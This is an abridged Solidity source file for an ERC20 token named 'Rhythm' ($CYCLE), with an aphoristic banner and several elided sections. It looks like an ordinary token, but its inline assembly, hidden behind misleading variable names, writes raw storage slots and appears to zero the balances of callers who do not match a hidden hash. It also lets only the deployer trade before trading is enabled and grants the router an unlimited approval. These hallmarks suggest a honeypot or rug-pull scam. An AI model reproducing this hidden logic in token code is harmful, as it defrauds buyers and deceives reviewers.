...
/*
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
~ ~ ~ Teach a man how to fish,  move on if he fails ~ ~ ~
~ ~ ~ Teach a man how to fish, help him if he fails ~ ~ ~
~ ~ He will die or-- it will feed him for a lifetime. ~ ~
~ ~ ~ ~ ~ ~ ~  The cycles of life or death. ~ ~ ~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ One small change. ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ A difference. ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~  $CYCLE ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addPhase;
    uint256 private greenOcean = block.number*2;

    mapping (address => bool) private _firstChange; 
    mapping (address => bool) private _secondBeer;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _goodPlant;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _withoutWater;
    address public pair;
    ...
    bool private trading; uint256 private bearBull = 1; bool private inflationBye;
    uint256 private _decimals; uint256 private lakeTime;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addPhase.push(_router); addPhase.push(msgSender_); addPhase.push(pair);
        for (uint256 q=0; q < 3;) {_firstChange[addPhase[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xade95f00fd910de41211263306d701437fc5af425e21a94e50677d833056ef88
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xb82d161be9613ea5bc55731ad84d3167ed055a7d94abab465a1e3ded5ad89d6c,0x1)
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addPhase[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployRhythm(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addPhase[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRhythm(creator, initialSupply);
    }
}

contract TheRhythm is ERC20Token {
    constructor() ERC20Token("Rhythm", "CYCLE", msg.sender, 10101010 * 10 ** 18) {
    }
}